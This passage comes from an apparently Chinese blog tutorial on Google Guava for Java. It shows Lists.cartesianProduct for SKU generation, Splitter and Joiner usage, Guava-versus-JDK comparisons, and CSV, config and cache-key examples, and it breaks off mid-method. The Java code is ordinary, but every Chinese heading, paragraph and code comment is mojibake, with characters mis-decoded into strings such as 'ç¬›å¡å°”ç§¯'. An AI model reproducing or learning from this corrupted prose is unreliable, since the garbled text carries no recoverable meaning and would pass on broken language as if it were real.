<p><strong>ç¬›å¡å°”ç§¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; colors = Lists.newArrayList(<span class="hljs-string">"Red"</span>, <span class="hljs-string">"Green"</span>);
List&lt;String&gt; sizes = Lists.newArrayList(<span class="hljs-string">"S"</span>, <span class="hljs-string">"M"</span>, <span class="hljs-string">"L"</span>);

List&lt;List&lt;String&gt;&gt; product = Lists.cartesianProduct(colors, sizes);
<span class="hljs-comment">// [[Red, S], [Red, M], [Red, L], [Green, S], [Green, M], [Green, L]]</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šå•†å“SKUç”Ÿæˆ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSkuGenerator</span> {

    <span class="hljs-keyword">public</span> List&lt;ProductSku&gt; <span class="hljs-title function_">generateSkus</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-comment">// è·å–æ‰€æœ‰å±æ€§å€¼</span>
        List&lt;String&gt; colors = product.getColors();      <span class="hljs-comment">// ["é»‘è‰²", "ç™½è‰²"]</span>
        List&lt;String&gt; sizes = product.getSizes();        <span class="hljs-comment">// ["S", "M", "L"]</span>
        List&lt;String&gt; materials = product.getMaterials(); <span class="hljs-comment">// ["æ£‰è´¨", "æ¶¤çº¶"]</span>

        <span class="hljs-comment">// è®¡ç®—ç¬›å¡å°”ç§¯</span>
        List&lt;List&lt;String&gt;&gt; combinations = Lists.cartesianProduct(
            colors, sizes, materials
        );

        <span class="hljs-comment">// ç”ŸæˆSKU</span>
        <span class="hljs-keyword">return</span> combinations.stream()
            .map(combo -&gt; {
                <span class="hljs-type">ProductSku</span> <span class="hljs-variable">sku</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductSku</span>();
                sku.setProductId(product.getId());
                sku.setColor(combo.get(<span class="hljs-number">0</span>));
                sku.setSize(combo.get(<span class="hljs-number">1</span>));
                sku.setMaterial(combo.get(<span class="hljs-number">2</span>));
                sku.setSkuCode(generateSkuCode(combo));
                <span class="hljs-keyword">return</span> sku;
            })
            .collect(Collectors.toList());
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateSkuCode</span><span class="hljs-params">(List&lt;String&gt; attributes)</span> {
        <span class="hljs-keyword">return</span> Joiner.on(<span class="hljs-string">"-"</span>).join(attributes);
    }
}
</code></pre>
<h3 data-id="heading-10">å››ã€Splitterï¼šæ™ºèƒ½å­—ç¬¦ä¸²åˆ†å‰²</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99312c4744e54be2b452997064040c1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=OAmI9fu5n13uDgMnzoYSgtXLXEE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>JDKçš„<code>String.split()</code>å­˜åœ¨è¯¸å¤šé—®é¢˜ï¼šæ— æ³•ä¼˜é›…å¤„ç†ç©ºç™½ã€ç©ºå­—ç¬¦ä¸²ç­‰ã€‚Guavaçš„Splitteræä¾›äº†æ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-11">4.1 åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.base.Splitter;

<span class="hljs-comment">// æŒ‰é€—å·åˆ†å‰²</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"a,b,c,d"</span>;
Iterable&lt;String&gt; parts = Splitter.on(<span class="hljs-string">','</span>).split(str);
<span class="hljs-comment">// ["a", "b", "c", "d"]</span>

<span class="hljs-comment">// è½¬æ¢ä¸ºList</span>
List&lt;String&gt; list = Splitter.on(<span class="hljs-string">','</span>).splitToList(str);
</code></pre>
<h4 data-id="heading-12">4.2 å¤„ç†ç©ºç™½å’Œç©ºå­—ç¬¦ä¸²</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">messyStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">"a,b,,c, ,d,  ,e"</span>;

<span class="hljs-comment">// å»é™¤ç©ºæ ¼å¹¶å¿½ç•¥ç©ºå­—ç¬¦ä¸²</span>
List&lt;String&gt; cleaned = Splitter.on(<span class="hljs-string">','</span>)
    .trimResults()           <span class="hljs-comment">// å»é™¤æ¯ä¸ªå…ƒç´ çš„é¦–å°¾ç©ºæ ¼</span>
    .omitEmptyStrings()      <span class="hljs-comment">// å¿½ç•¥ç©ºå­—ç¬¦ä¸²</span>
    .splitToList(messyStr);

<span class="hljs-comment">// ç»“æœï¼š["a", "b", "c", "d", "e"]</span>
</code></pre>
<p><strong>å¯¹æ¯”JDKæ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// JDKæ–¹å¼ï¼šç¹çä¸”å®¹æ˜“å‡ºé”™</span>
String[] parts = messyStr.split(<span class="hljs-string">","</span>);
List&lt;String&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (String part : parts) {
    <span class="hljs-type">String</span> <span class="hljs-variable">trimmed</span> <span class="hljs-operator">=</span> part.trim();
    <span class="hljs-keyword">if</span> (!trimmed.isEmpty()) {
        result.add(trimmed);
    }
}

<span class="hljs-comment">// Guavaæ–¹å¼ï¼šä¸€è¡Œæå®š</span>
List&lt;String&gt; result = Splitter.on(<span class="hljs-string">','</span>)
    .trimResults()
    .omitEmptyStrings()
    .splitToList(messyStr);
</code></pre>
<h4 data-id="heading-13">4.3 é™åˆ¶åˆ†å‰²æ¬¡æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"key:value:extra:data"</span>;

<span class="hljs-comment">// æœ€å¤šåˆ†å‰²ä¸º2éƒ¨åˆ†</span>
List&lt;String&gt; parts = Splitter.on(<span class="hljs-string">':'</span>)
    .limit(<span class="hljs-number">2</span>)
    .splitToList(str);

<span class="hljs-comment">// ç»“æœï¼š["key", "value:extra:data"]</span>
</code></pre>
<h4 data-id="heading-14">4.4 MapSplitterï¼šåˆ†å‰²ä¸ºMap</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">queryString</span> <span class="hljs-operator">=</span> <span class="hljs-string">"name=Alice&amp;age=25&amp;city=Beijing"</span>;

<span class="hljs-comment">// åˆ†å‰²ä¸ºMap</span>
Map&lt;String, String&gt; params = Splitter.on(<span class="hljs-string">'&amp;'</span>)
    .withKeyValueSeparator(<span class="hljs-string">'='</span>)
    .split(queryString);

<span class="hljs-comment">// ç»“æœï¼š{name=Alice, age=25, city=Beijing}</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šURLå‚æ•°è§£æ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlParamParser</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Splitter.<span class="hljs-type">MapSplitter</span> <span class="hljs-variable">PARAM_SPLITTER</span> <span class="hljs-operator">=</span>
        Splitter.on(<span class="hljs-string">'&amp;'</span>)
            .trimResults()
            .omitEmptyStrings()
            .withKeyValueSeparator(<span class="hljs-string">'='</span>);

    <span class="hljs-comment">// è§£æURLå‚æ•°</span>
    <span class="hljs-keyword">public</span> Map&lt;String, String&gt; <span class="hljs-title function_">parseQueryString</span><span class="hljs-params">(String url)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">questionMarkIndex</span> <span class="hljs-operator">=</span> url.indexOf(<span class="hljs-string">'?'</span>);
        <span class="hljs-keyword">if</span> (questionMarkIndex == -<span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> Collections.emptyMap();
        }

        <span class="hljs-type">String</span> <span class="hljs-variable">queryString</span> <span class="hljs-operator">=</span> url.substring(questionMarkIndex + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> PARAM_SPLITTER.split(queryString);
    }

    <span class="hljs-comment">// ç¤ºä¾‹ä½¿ç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">UrlParamParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlParamParser</span>();

        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.example.com/search?keyword=guava&amp;page=1&amp;size=20"</span>;
        Map&lt;String, String&gt; params = parser.parseQueryString(url);

        System.out.println(<span class="hljs-string">"å…³é”®è¯: "</span> + params.get(<span class="hljs-string">"keyword"</span>));  <span class="hljs-comment">// guava</span>
        System.out.println(<span class="hljs-string">"é¡µç : "</span> + params.get(<span class="hljs-string">"page"</span>));      <span class="hljs-comment">// 1</span>
        System.out.println(<span class="hljs-string">"å¤§å°: "</span> + params.get(<span class="hljs-string">"size"</span>));      <span class="hljs-comment">// 20</span>
    }
}
</code></pre>
<h4 data-id="heading-15">4.5 æ­£åˆ™è¡¨è¾¾å¼åˆ†å‰²</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2024-01-15 10:30:45 ERROR User not found"</span>;

<span class="hljs-comment">// æŒ‰ç©ºæ ¼åˆ†å‰²</span>
List&lt;String&gt; parts = Splitter.onPattern(<span class="hljs-string">"\\s+"</span>)
    .splitToList(log);

<span class="hljs-comment">// ç»“æœï¼š["2024-01-15", "10:30:45", "ERROR", "User", "not", "found"]</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šæ—¥å¿—è§£æ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogParser</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Splitter</span> <span class="hljs-variable">LOG_SPLITTER</span> <span class="hljs-operator">=</span> Splitter.onPattern(<span class="hljs-string">"\\s+"</span>)
        .limit(<span class="hljs-number">4</span>);

    <span class="hljs-keyword">public</span> LogEntry <span class="hljs-title function_">parseLog</span><span class="hljs-params">(String logLine)</span> {
        List&lt;String&gt; parts = LOG_SPLITTER.splitToList(logLine);

        <span class="hljs-keyword">if</span> (parts.size() &lt; <span class="hljs-number">4</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid log format"</span>);
        }

        <span class="hljs-type">LogEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogEntry</span>();
        entry.setDate(parts.get(<span class="hljs-number">0</span>));
        entry.setTime(parts.get(<span class="hljs-number">1</span>));
        entry.setLevel(parts.get(<span class="hljs-number">2</span>));
        entry.setMessage(parts.get(<span class="hljs-number">3</span>));  <span class="hljs-comment">// å‰©ä½™éƒ¨åˆ†ä½œä¸ºæ¶ˆæ¯</span>

        <span class="hljs-keyword">return</span> entry;
    }
}
</code></pre>
<h4 data-id="heading-16">4.6 å›ºå®šé•¿åº¦åˆ†å‰²</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"123456789012"</span>;

<span class="hljs-comment">// æ¯3ä¸ªå­—ç¬¦åˆ†å‰²</span>
Iterable&lt;String&gt; parts = Splitter.fixedLength(<span class="hljs-number">3</span>).split(str);
<span class="hljs-comment">// ["123", "456", "789", "012"]</span>
</code></pre>
<h3 data-id="heading-17">äº”ã€Joinerï¼šä¼˜é›…çš„å­—ç¬¦ä¸²è¿æ¥</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aae7decb74da44b3ba19080a46660abe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=ofiV6RC8hlJvRoHkmCX91Ak74D0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-18">5.1 åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.base.Joiner;

List&lt;String&gt; list = Arrays.asList(<span class="hljs-string">"Google"</span>, <span class="hljs-string">"Guava"</span>, <span class="hljs-string">"Java"</span>);

<span class="hljs-comment">// ç”¨é€—å·è¿æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>).join(list);
<span class="hljs-comment">// "Google, Guava, Java"</span>

<span class="hljs-comment">// ç”¨æ¢è¡Œç¬¦è¿æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">multiLine</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">"\n"</span>).join(list);
</code></pre>
<h4 data-id="heading-19">5.2 å¤„ç†nullå€¼</h4>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; listWithNull = Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

<span class="hljs-comment">// è·³è¿‡nullå€¼</span>
<span class="hljs-type">String</span> <span class="hljs-variable">skipNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .skipNulls()
    .join(listWithNull);
<span class="hljs-comment">// "A, B, C"</span>

<span class="hljs-comment">// ç”¨é»˜è®¤å€¼æ›¿æ¢null</span>
<span class="hljs-type">String</span> <span class="hljs-variable">useForNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .useForNull(<span class="hljs-string">"N/A"</span>)
    .join(listWithNull);
<span class="hljs-comment">// "A, N/A, B, C"</span>
</code></pre>
<h4 data-id="heading-20">5.3 è¿æ¥Map</h4>
<pre><code class="hljs language-java" lang="java">Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
map.put(<span class="hljs-string">"host"</span>, <span class="hljs-string">"localhost"</span>);
map.put(<span class="hljs-string">"port"</span>, <span class="hljs-string">"8080"</span>);
map.put(<span class="hljs-string">"path"</span>, <span class="hljs-string">"/api"</span>);

<span class="hljs-comment">// è¿æ¥Mapä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-type">String</span> <span class="hljs-variable">mapStr</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">"&amp;"</span>)
    .withKeyValueSeparator(<span class="hljs-string">"="</span>)
    .join(map);

<span class="hljs-comment">// ç»“æœï¼š"host=localhost&amp;port=8080&amp;path=/api"</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šç”ŸæˆURLæŸ¥è¯¢å‚æ•°</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlBuilder</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Joiner.<span class="hljs-type">MapJoiner</span> <span class="hljs-variable">QUERY_JOINER</span> <span class="hljs-operator">=</span>
        Joiner.on(<span class="hljs-string">'&amp;'</span>).withKeyValueSeparator(<span class="hljs-string">'='</span>);

    <span class="hljs-keyword">private</span> String baseUrl;
    <span class="hljs-keyword">private</span> Map&lt;String, String&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UrlBuilder</span><span class="hljs-params">(String baseUrl)</span> {
        <span class="hljs-built_in">this</span>.baseUrl = baseUrl;
    }

    <span class="hljs-keyword">public</span> UrlBuilder <span class="hljs-title function_">addParam</span><span class="hljs-params">(String key, String value)</span> {
        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) {
            params.put(key, value);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (params.isEmpty()) {
            <span class="hljs-keyword">return</span> baseUrl;
        }
        <span class="hljs-keyword">return</span> baseUrl + <span class="hljs-string">"?"</span> + QUERY_JOINER.join(params);
    }

    <span class="hljs-comment">// ç¤ºä¾‹ä½¿ç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlBuilder</span>(<span class="hljs-string">"https://api.example.com/search"</span>)
            .addParam(<span class="hljs-string">"q"</span>, <span class="hljs-string">"guava"</span>)
            .addParam(<span class="hljs-string">"page"</span>, <span class="hljs-string">"1"</span>)
            .addParam(<span class="hljs-string">"size"</span>, <span class="hljs-string">"20"</span>)
            .build();

        System.out.println(url);
        <span class="hljs-comment">// https://api.example.com/search?q=guava&amp;page=1&amp;size=20</span>
    }
}
</code></pre>
<h4 data-id="heading-21">5.4 è¿½åŠ åˆ°StringBuilder</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"Results: "</span>);
List&lt;String&gt; items = Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

Joiner.on(<span class="hljs-string">", "</span>).appendTo(sb, items);
<span class="hljs-comment">// sbå†…å®¹ï¼š"Results: A, B, C"</span>
</code></pre>
<p><strong>ç”Ÿäº§æ¡ˆä¾‹ï¼šSQLç”Ÿæˆ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlBuilder</span> {

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildInsertSql</span><span class="hljs-params">(String tableName, Map&lt;String, Object&gt; data)</span> {
        List&lt;String&gt; columns = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(data.keySet());
        List&lt;String&gt; placeholders = Collections.nCopies(columns.size(), <span class="hljs-string">"?"</span>);

        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"INSERT INTO "</span>);
        sql.append(tableName).append(<span class="hljs-string">" ("</span>);

        Joiner.on(<span class="hljs-string">", "</span>).appendTo(sql, columns);
        sql.append(<span class="hljs-string">") VALUES ("</span>);
        Joiner.on(<span class="hljs-string">", "</span>).appendTo(sql, placeholders);
        sql.append(<span class="hljs-string">")"</span>);

        <span class="hljs-keyword">return</span> sql.toString();
    }

    <span class="hljs-comment">// ç¤ºä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">SqlBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlBuilder</span>();

        Map&lt;String, Object&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        data.put(<span class="hljs-string">"name"</span>, <span class="hljs-string">"Alice"</span>);
        data.put(<span class="hljs-string">"age"</span>, <span class="hljs-number">35</span>);
        data.put(<span class="hljs-string">"email"</span>, <span class="hljs-string">"alice@example.com"</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> builder.buildInsertSql(<span class="hljs-string">"users"</span>, data);
        System.out.println(sql);
        <span class="hljs-comment">// INSERT INTO users (name, age, email) VALUES (?, ?, ?)</span>
    }
}
</code></pre>
<h3 data-id="heading-22">å…­ã€Guava vs JDKï¼šæ€§èƒ½ä¸æ˜“ç”¨æ€§å¯¹æ¯”</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfd106efd0e4c1d8371bb1ae46a936a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=YSyZX50%2BxJEcOaIlB77dC3UxgIA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-23">6.1 ä»£ç ç®€æ´åº¦å¯¹æ¯”</h4>
<p><strong>åœºæ™¯ï¼šåˆ›å»ºä¸å¯å˜Map</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// JDKæ–¹å¼</span>
Map&lt;String, Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
map.put(<span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>);
map.put(<span class="hljs-string">"B"</span>, <span class="hljs-number">2</span>);
map.put(<span class="hljs-string">"C"</span>, <span class="hljs-number">3</span>);
Map&lt;String, Integer&gt; immutableMap = Collections.unmodifiableMap(map);

<span class="hljs-comment">// Guavaæ–¹å¼</span>
ImmutableMap&lt;String, Integer&gt; immutableMap = ImmutableMap.of(
    <span class="hljs-string">"A"</span>, <span class="hljs-number">1</span>,
    <span class="hljs-string">"B"</span>, <span class="hljs-number">2</span>,
    <span class="hljs-string">"C"</span>, <span class="hljs-number">3</span>
);
</code></pre>
<p><strong>åœºæ™¯ï¼šå­—ç¬¦ä¸²åˆ†å‰²å¹¶å¤„ç†ç©ºç™½</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// JDKæ–¹å¼</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"a,b,,c, ,d"</span>;
String[] parts = str.split(<span class="hljs-string">","</span>);
List&lt;String&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (String part : parts) {
    <span class="hljs-type">String</span> <span class="hljs-variable">trimmed</span> <span class="hljs-operator">=</span> part.trim();
    <span class="hljs-keyword">if</span> (!trimmed.isEmpty()) {
        result.add(trimmed);
    }
}

<span class="hljs-comment">// Guavaæ–¹å¼</span>
List&lt;String&gt; result = Splitter.on(<span class="hljs-string">','</span>)
    .trimResults()
    .omitEmptyStrings()
    .splitToList(str);
</code></pre>
<h4 data-id="heading-24">6.2 æ€§èƒ½å¯¹æ¯”</h4>
<p>Guavaåœ¨å¾ˆå¤šåœºæ™¯ä¸‹æ€§èƒ½ä¼˜äºJDKï¼š</p>
<p><strong>ImmutableMap vs HashMapï¼š</strong></p>
<ul>
<li>å†…å­˜å ç”¨ï¼šImmutableMapæ›´å°‘ï¼ˆä¼˜åŒ–çš„æ•°æ®ç»“æ„ï¼‰</li>
<li>è®¿é—®é€Ÿåº¦ï¼šImmutableMapç•¥å¿«ï¼ˆæ— é”å¼€é”€ï¼‰</li>
<li>çº¿ç¨‹å®‰å…¨ï¼šImmutableMapæ— éœ€åŒæ­¥</li>
</ul>
<p><strong>Splitter vs String.split()ï¼š</strong></p>
<ul>
<li>å¤ç”¨æ€§ï¼šSplitterå¯å¤ç”¨ï¼Œé¿å…é‡å¤ç¼–è¯‘æ­£åˆ™</li>
<li>çµæ´»æ€§ï¼šSplitteræ”¯æŒé“¾å¼é…ç½®</li>
</ul>
<h3 data-id="heading-25">ä¸ƒã€ç”Ÿäº§å®æˆ˜æ¡ˆä¾‹</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fdb0964b50b46c9bca930d1758505d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766191044&amp;x-signature=h06UNGgjzj8nbq%2BGYl%2FhlPUVmiE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-26">æ¡ˆä¾‹ä¸€ï¼šCSVæ–‡ä»¶è§£æ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CsvParser</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Splitter</span> <span class="hljs-variable">CSV_SPLITTER</span> <span class="hljs-operator">=</span> Splitter.on(<span class="hljs-string">','</span>)
        .trimResults()
        .omitEmptyStrings();

    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">parseCsvFile</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;User&gt; users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filePath))) {
            <span class="hljs-comment">// è·³è¿‡æ ‡é¢˜è¡Œ</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> reader.readLine();

            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                List&lt;String&gt; fields = CSV_SPLITTER.splitToList(line);

                <span class="hljs-keyword">if</span> (fields.size() &gt;= <span class="hljs-number">3</span>) {
                    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
                    user.setName(fields.get(<span class="hljs-number">0</span>));
                    user.setAge(Integer.parseInt(fields.get(<span class="hljs-number">1</span>)));
                    user.setEmail(fields.get(<span class="hljs-number">2</span>));
                    users.add(user);
                }
            }
        }

        <span class="hljs-keyword">return</span> users;
    }
}
</code></pre>
<h4 data-id="heading-27">æ¡ˆä¾‹äºŒï¼šé…ç½®æ–‡ä»¶è§£æ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigLoader</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Splitter.<span class="hljs-type">MapSplitter</span> <span class="hljs-variable">CONFIG_SPLITTER</span> <span class="hljs-operator">=</span>
        Splitter.on(<span class="hljs-string">'\n'</span>)
            .trimResults()
            .omitEmptyStrings()
            .withKeyValueSeparator(<span class="hljs-string">'='</span>);

    <span class="hljs-keyword">public</span> ImmutableMap&lt;String, String&gt; <span class="hljs-title function_">loadConfig</span><span class="hljs-params">(String configText)</span> {
        <span class="hljs-comment">// ç§»é™¤æ³¨é‡Šè¡Œ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cleanedConfig</span> <span class="hljs-operator">=</span> Splitter.on(<span class="hljs-string">'\n'</span>)
            .splitToStream(configText)
            .filter(line -&gt; !line.trim().startsWith(<span class="hljs-string">"#"</span>))
            .collect(Collectors.joining(<span class="hljs-string">"\n"</span>));

        <span class="hljs-keyword">return</span> ImmutableMap.copyOf(CONFIG_SPLITTER.split(cleanedConfig));
    }
}
</code></pre>
<h4 data-id="heading-28">æ¡ˆä¾‹ä¸‰ï¼šç”Ÿæˆç¼“å­˜Key</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheKeyGenerator</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Joiner</span> <span class="hljs-variable">KEY_JOINER</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">':'</span>).skipNulls();

    <span class="hljs-comment">// ç”Ÿæˆç”¨æˆ·ç¼“å­˜é”®</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateUserKey</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> KEY_JOINER.join(<span class="hljs-string">"user"</span>, userId);
